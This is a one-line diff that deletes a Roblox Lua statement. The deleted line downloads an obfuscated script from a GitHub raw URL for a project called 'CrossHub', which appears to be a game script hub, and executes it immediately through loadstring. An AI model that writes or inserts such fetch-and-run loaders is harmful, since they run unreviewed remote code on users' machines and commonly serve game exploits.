@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/CrossiDev/CrossHub/main/crosshubmakegamesobfuscated.txt"))()
